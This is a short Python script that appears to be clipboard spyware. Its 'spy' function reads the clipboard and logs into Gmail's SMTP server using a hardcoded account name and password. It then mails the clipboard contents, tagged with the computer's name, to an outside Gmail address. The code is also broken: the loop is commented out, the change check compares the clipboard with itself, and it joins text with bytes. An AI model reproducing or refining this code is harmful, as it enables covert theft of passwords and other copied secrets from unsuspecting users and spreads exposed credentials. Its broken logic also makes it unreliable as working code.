import pyperclip
import smtplib
import keyboard
import os

def spy():

	data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()

	server.login("jacksonsoftwaresolutions", "Bt(c@245")

	#while True:

	if data != pyperclip.paste().encode("utf-8"):	
				
		data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
		print(data)

		server.sendmail("jacksonsoftwaresolutions@gmail.com",
		"jacksonsoftwaresolutions@gmail.com", os.environ['COMPUTERNAME']+data)

	server.close()

if __name__=="__main__":
	spy()